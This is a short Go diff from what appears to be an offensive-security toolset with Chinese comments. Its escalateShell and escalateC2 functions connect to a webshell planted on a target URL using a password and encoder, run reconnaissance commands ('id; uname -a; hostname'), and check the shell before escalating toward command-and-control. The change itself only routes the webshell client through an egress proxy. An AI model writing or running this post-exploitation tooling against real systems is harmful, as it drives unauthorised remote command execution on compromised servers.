@@ -239,7 +239,7 @@ func (t *ToolSet) escalateShell(ctx context.Context, targetURL string, params ma
 
 	// 信息收集
 	report.WriteString("[2/3] 快速信息收集\n")
-	cli := &webshell.Client{URL: targetURL, Password: password, Encoder: encoder, ScriptType: scriptType}
+	cli := &webshell.Client{URL: targetURL, Password: password, Encoder: encoder, ScriptType: scriptType, Proxy: t.egressProxyFor(targetURL)}
 	res, err := cli.ExecCmd("id; uname -a; hostname")
 	if err == nil && res.OK {
 		report.WriteString(fmt.Sprintf("  ✅ %s\n", truncateStr(res.Output, 200)))
@@ -281,7 +281,7 @@ func (t *ToolSet) escalateC2(ctx context.Context, targetURL string, params map[s
 		scriptType = "php"
 	}
 	report.WriteString("[1/2] 验证 Webshell\n")
-	cli := &webshell.Client{URL: targetURL, Password: password, Encoder: encoder, ScriptType: scriptType}
+	cli := &webshell.Client{URL: targetURL, Password: password, Encoder: encoder, ScriptType: scriptType, Proxy: t.egressProxyFor(targetURL)}
 	testRes, err := cli.Test()
 	if err != nil || !testRes.OK {
 		report.WriteString("  ❌ Webshell 不可达\n")
